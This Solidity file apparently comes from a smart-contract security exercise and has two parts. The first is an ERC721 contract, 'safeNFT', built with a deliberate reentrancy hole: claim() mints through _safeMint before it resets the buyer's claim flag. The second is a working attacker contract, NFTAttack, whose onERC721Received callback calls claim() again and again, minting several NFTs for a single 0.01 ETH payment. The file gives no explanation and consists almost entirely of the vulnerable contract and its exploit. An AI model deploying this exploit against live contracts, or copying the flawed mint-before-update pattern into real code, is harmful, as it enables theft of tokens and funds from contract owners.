// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "hardhat/console.sol";

contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address => bool) public canClaim;

    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint256 _price
    ) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price == msg.value, "INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender], "CANT_MINT");
        _safeMint(msg.sender, totalSupply());
        canClaim[msg.sender] = false;
    }
}



///////////////Attacker contract

contract NFTAttack{    
        uint public i;
        bool complete;
        safeNFT public add;
        constructor(address addre) payable {
            add=safeNFT(addre);
        }

    function exploit() public payable  {
            add.buyNFT{value: 0.01 ether}();
            add.claim();
    }

function onERC721Received(address from, address _from, uint256 _tokenId, bytes calldata) external  returns(bytes4) {
    console.log("reentrancy exploit");
    if(i<5){
        i++;
        add.claim();
    }

    return 0x150b7a02;
}

}